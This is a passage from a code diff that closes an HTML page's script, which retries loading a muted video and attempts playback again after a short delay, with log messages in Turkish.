+                        console.log('Video hala yüklenmedi, tekrar deneniyor...');
+                        video.load();
+                    }
+                    // Ses seviyesini tekrar kontrol et
+                    video.volume = 0;
+                    video.muted = true;
+                    // Tekrar oynatmayı dene
+                    if (video.readyState >= 2) {
+                        video.play().catch(err => {
+                            console.error('İkinci oynatma denemesi başarısız:', err);
+                        });
+                    }
+                }, 2000);
+            }
+        });
+    </script>
+</body>
+</html>
